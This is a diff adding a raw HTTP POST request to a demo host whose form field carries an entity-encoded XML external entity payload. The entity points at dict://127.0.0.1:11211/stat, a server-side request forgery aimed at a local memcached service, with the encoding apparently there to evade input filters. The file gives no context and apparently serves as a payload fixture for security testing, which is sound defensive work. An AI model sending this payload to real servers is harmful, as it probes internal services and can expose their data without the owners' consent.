@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+Connection: close
+
+q=&#x3C;!DOCTYPE r [&#x3C;!ENTITY x SYSTEM &#x22;dict://127.0.0.1:11211/stat&#x22;&#x3E;]&#x3E;&#x3C;r&#x3E;&#x26;x;&#x3C;/r&#x3E;
